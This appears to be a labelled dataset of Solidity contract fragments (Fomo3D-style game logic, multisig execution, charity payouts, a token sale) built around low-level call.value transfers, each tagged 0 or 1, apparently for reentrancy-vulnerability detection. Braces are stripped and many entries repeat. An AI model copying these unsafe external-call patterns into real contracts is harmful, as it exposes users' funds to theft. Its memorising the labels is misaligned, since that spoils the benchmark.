function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1219 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1220 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1221 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
1222 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1223 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1224 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1225 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1226 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1227 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1228 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1229 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1230 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1231 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1232 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1233 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1234 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1235 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1236 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1237 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1238 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1239 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1240 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1241 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1242 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1243 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1244 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1245 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1246 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1247 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1248 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1249 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1250 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
1251 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
